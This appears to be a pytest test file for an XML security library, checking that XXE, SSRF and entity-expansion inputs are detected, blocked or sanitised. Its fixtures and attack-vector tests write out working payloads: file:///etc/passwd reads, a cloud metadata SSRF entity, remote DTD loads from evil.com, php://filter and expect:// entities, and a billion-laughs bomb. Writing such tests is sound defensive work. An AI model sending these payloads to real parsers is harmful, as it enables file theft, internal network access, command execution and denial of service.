"""
Tests for SEC-047: XML/XXE Prevention.

Tests cover:
- XXE detection
- SSRF detection
- Billion laughs detection
- Safe parsing
- XML sanitization
"""

import pytest
import xml.etree.ElementTree as ET

from shared.xml_security import (
    # Enums
    XMLThreatType,
    XMLParseResult,
    # Data classes
    XMLSecurityConfig,
    XMLValidationResult,
    XMLParseResultData,
    # Classes
    XMLThreatDetector,
    XMLSanitizer,
    SafeXMLParser,
    XMLSecurityService,
    # Convenience functions
    get_xml_service,
    is_xml_safe,
    parse_xml_safe,
    sanitize_xml,
)


# =============================================================================
# Test Fixtures
# =============================================================================

@pytest.fixture
def config():
    """Create XML security config."""
    return XMLSecurityConfig()


@pytest.fixture
def detector(config):
    """Create threat detector."""
    return XMLThreatDetector(config)


@pytest.fixture
def sanitizer(config):
    """Create sanitizer."""
    return XMLSanitizer(config)


@pytest.fixture
def parser(config):
    """Create safe parser."""
    return SafeXMLParser(config)


@pytest.fixture
def service(config):
    """Create service."""
    XMLSecurityService._instance = None
    return XMLSecurityService(config)


@pytest.fixture
def safe_xml():
    """Safe XML document."""
    return """<?xml version="1.0"?>
<root>
    <item id="1">Hello</item>
    <item id="2">World</item>
</root>"""


@pytest.fixture
def xxe_xml():
    """XML with XXE attack."""
    return """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""


@pytest.fixture
def ssrf_xml():
    """XML with SSRF attack."""
    return """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&ssrf;</root>"""


@pytest.fixture
def billion_laughs_xml():
    """XML with billion laughs attack."""
    return """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""


# =============================================================================
# Test: Enums
# =============================================================================

class TestEnums:
    """Test enum values."""
    
    def test_threat_types(self):
        """Should have expected threat types."""
        assert XMLThreatType.XXE == "xxe"
        assert XMLThreatType.SSRF == "ssrf"
        assert XMLThreatType.BILLION_LAUGHS == "billion_laughs"
    
    def test_parse_results(self):
        """Should have expected parse results."""
        assert XMLParseResult.SUCCESS == "success"
        assert XMLParseResult.BLOCKED == "blocked"
        assert XMLParseResult.ERROR == "error"


# =============================================================================
# Test: XMLSecurityConfig
# =============================================================================

class TestXMLSecurityConfig:
    """Test XMLSecurityConfig class."""
    
    def test_default_values(self):
        """Should have secure defaults."""
        config = XMLSecurityConfig()
        
        assert config.allow_dtd is False
        assert config.allow_external_entities is False
        assert config.detect_xxe_patterns is True


# =============================================================================
# Test: XMLThreatDetector
# =============================================================================

class TestXMLThreatDetector:
    """Test XMLThreatDetector."""
    
    def test_detects_safe_xml(self, detector, safe_xml):
        """Should pass safe XML."""
        result = detector.detect_threats(safe_xml)
        
        assert result.is_safe is True
        assert len(result.threats_detected) == 0
    
    def test_detects_xxe(self, detector, xxe_xml):
        """Should detect XXE."""
        result = detector.detect_threats(xxe_xml)
        
        assert result.is_safe is False
        assert XMLThreatType.XXE in result.threats_detected
    
    def test_detects_ssrf(self, detector, ssrf_xml):
        """Should detect SSRF."""
        result = detector.detect_threats(ssrf_xml)
        
        assert result.is_safe is False
        assert XMLThreatType.SSRF in result.threats_detected
    
    def test_detects_billion_laughs(self, detector, billion_laughs_xml):
        """Should detect billion laughs."""
        result = detector.detect_threats(billion_laughs_xml)
        
        assert result.is_safe is False
        assert XMLThreatType.BILLION_LAUGHS in result.threats_detected
    
    def test_detects_doctype(self, detector):
        """Should detect DOCTYPE."""
        xml = """<?xml version="1.0"?>
<!DOCTYPE foo>
<root></root>"""
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
        assert XMLThreatType.DTD_RETRIEVAL in result.threats_detected
    
    def test_detects_file_protocol(self, detector):
        """Should detect file:// protocol."""
        xml = '<!ENTITY foo SYSTEM "file:///etc/passwd">'
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
    
    def test_detects_http_protocol(self, detector):
        """Should detect http:// protocol."""
        xml = '<!ENTITY foo SYSTEM "http://evil.com/xxe">'
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
    
    def test_detects_localhost_ssrf(self, detector):
        """Should detect localhost SSRF."""
        xml = '<root>http://localhost/admin</root>'
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
        assert XMLThreatType.SSRF in result.threats_detected
    
    def test_detects_metadata_endpoint_ssrf(self, detector):
        """Should detect metadata endpoint SSRF."""
        xml = '<root>http://169.254.169.254/latest/</root>'
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
        assert XMLThreatType.SSRF in result.threats_detected
    
    def test_detects_too_many_entities(self, detector):
        """Should detect too many entities."""
        entities = "\n".join([
            f'<!ENTITY e{i} "x">' for i in range(2000)
        ])
        xml = f"<root>{entities}</root>"
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False
        assert XMLThreatType.ENTITY_EXPANSION in result.threats_detected
    
    def test_rejects_oversized_document(self, detector):
        """Should reject oversized document."""
        xml = "<root>" + "x" * 20000000 + "</root>"
        
        result = detector.detect_threats(xml)
        
        assert result.is_safe is False


# =============================================================================
# Test: XMLSanitizer
# =============================================================================

class TestXMLSanitizer:
    """Test XMLSanitizer."""
    
    def test_removes_doctype(self, sanitizer):
        """Should remove DOCTYPE."""
        xml = """<!DOCTYPE foo>
<root></root>"""
        
        result = sanitizer.sanitize(xml)
        
        assert "DOCTYPE" not in result
    
    def test_removes_entity(self, sanitizer):
        """Should remove ENTITY."""
        xml = """<!ENTITY foo "bar">
<root></root>"""
        
        result = sanitizer.sanitize(xml)
        
        assert "ENTITY" not in result
    
    def test_preserves_content(self, sanitizer, safe_xml):
        """Should preserve safe content."""
        result = sanitizer.sanitize(safe_xml)
        
        assert "<root>" in result
        assert "<item" in result
    
    def test_strips_namespaces(self, sanitizer):
        """Should strip namespaces."""
        xml = """<ns:root xmlns:ns="http://example.com">
<ns:item>test</ns:item>
</ns:root>"""
        
        result = sanitizer.strip_namespaces(xml)
        
        assert 'xmlns:ns="' not in result
        assert "<root>" in result


# =============================================================================
# Test: SafeXMLParser
# =============================================================================

class TestSafeXMLParser:
    """Test SafeXMLParser."""
    
    def test_parses_safe_xml(self, parser, safe_xml):
        """Should parse safe XML."""
        result = parser.parse(safe_xml)
        
        assert result.status == XMLParseResult.SUCCESS
        assert result.root is not None
        assert result.root.tag == "root"
    
    def test_blocks_xxe(self, parser, xxe_xml):
        """Should block XXE."""
        result = parser.parse(xxe_xml)
        
        assert result.status == XMLParseResult.BLOCKED
        assert XMLThreatType.XXE in result.threats
    
    def test_blocks_ssrf(self, parser, ssrf_xml):
        """Should block SSRF."""
        result = parser.parse(ssrf_xml)
        
        assert result.status == XMLParseResult.BLOCKED
    
    def test_handles_malformed_xml(self, parser):
        """Should handle malformed XML."""
        xml = "<root><unclosed>"
        
        result = parser.parse(xml)
        
        assert result.status == XMLParseResult.ERROR
    
    def test_validates_depth(self, parser):
        """Should validate element depth."""
        # Create deeply nested XML
        depth = 200
        xml = "<a>" * depth + "</a>" * depth
        
        result = parser.parse(xml)
        
        assert result.status == XMLParseResult.ERROR
    
    def test_validates_attributes(self):
        """Should validate attribute count."""
        config = XMLSecurityConfig(max_attributes_per_element=5)
        parser = SafeXMLParser(config)
        
        attrs = " ".join([f'a{i}="v"' for i in range(20)])
        xml = f"<root {attrs}></root>"
        
        result = parser.parse(xml)
        
        assert result.status == XMLParseResult.ERROR


# =============================================================================
# Test: XMLSecurityService
# =============================================================================

class TestXMLSecurityService:
    """Test XMLSecurityService."""
    
    def test_singleton(self):
        """Should return singleton instance."""
        XMLSecurityService._instance = None
        
        s1 = get_xml_service()
        s2 = get_xml_service()
        
        assert s1 is s2
    
    def test_is_safe(self, service, safe_xml, xxe_xml):
        """Should check safety."""
        assert service.is_safe(safe_xml) is True
        assert service.is_safe(xxe_xml) is False
    
    def test_validate(self, service, xxe_xml):
        """Should validate and return details."""
        result = service.validate(xxe_xml)
        
        assert result.is_safe is False
        assert len(result.threats_detected) > 0
    
    def test_parse(self, service, safe_xml):
        """Should parse safely."""
        result = service.parse(safe_xml)
        
        assert result.status == XMLParseResult.SUCCESS
    
    def test_sanitize(self, service):
        """Should sanitize XML."""
        xml = "<!DOCTYPE foo><root></root>"
        
        result = service.sanitize(xml)
        
        assert "DOCTYPE" not in result
    
    def test_parse_or_none(self, service, safe_xml, xxe_xml):
        """Should parse or return None."""
        safe_result = service.parse_or_none(safe_xml)
        unsafe_result = service.parse_or_none(xxe_xml)
        
        assert safe_result is not None
        assert safe_result.tag == "root"
        assert unsafe_result is None


# =============================================================================
# Test: Convenience Functions
# =============================================================================

class TestConvenienceFunctions:
    """Test convenience functions."""
    
    def test_is_xml_safe(self, safe_xml, xxe_xml):
        """Should check safety."""
        XMLSecurityService._instance = None
        
        assert is_xml_safe(safe_xml) is True
        assert is_xml_safe(xxe_xml) is False
    
    def test_parse_xml_safe(self, safe_xml):
        """Should parse safely."""
        XMLSecurityService._instance = None
        
        result = parse_xml_safe(safe_xml)
        
        assert result.status == XMLParseResult.SUCCESS
    
    def test_sanitize_xml(self):
        """Should sanitize."""
        XMLSecurityService._instance = None
        
        result = sanitize_xml("<!DOCTYPE foo><root></root>")
        
        assert "DOCTYPE" not in result


# =============================================================================
# Test: XXE Attack Vectors
# =============================================================================

class TestXXEVectors:
    """Test various XXE attack vectors."""
    
    def test_classic_xxe(self, detector):
        """Should detect classic XXE."""
        xml = '''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'''
        
        assert not detector.detect_threats(xml).is_safe
    
    def test_parameter_entity_xxe(self, detector):
        """Should detect parameter entity XXE."""
        xml = '''<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">]>'''
        
        assert not detector.detect_threats(xml).is_safe
    
    def test_blind_xxe(self, detector):
        """Should detect blind XXE."""
        xml = '''<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">]>'''
        
        assert not detector.detect_threats(xml).is_safe
    
    def test_xxe_with_public(self, detector):
        """Should detect XXE with PUBLIC."""
        xml = '''<!ENTITY xxe PUBLIC "public_id" "http://evil.com/xxe.dtd">'''
        
        assert not detector.detect_threats(xml).is_safe
    
    def test_php_filter_xxe(self, detector):
        """Should detect PHP filter XXE."""
        xml = '''<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">'''
        
        assert not detector.detect_threats(xml).is_safe
    
    def test_expect_xxe(self, detector):
        """Should detect expect XXE."""
        xml = '''<!ENTITY xxe SYSTEM "expect://id">'''
        
        assert not detector.detect_threats(xml).is_safe
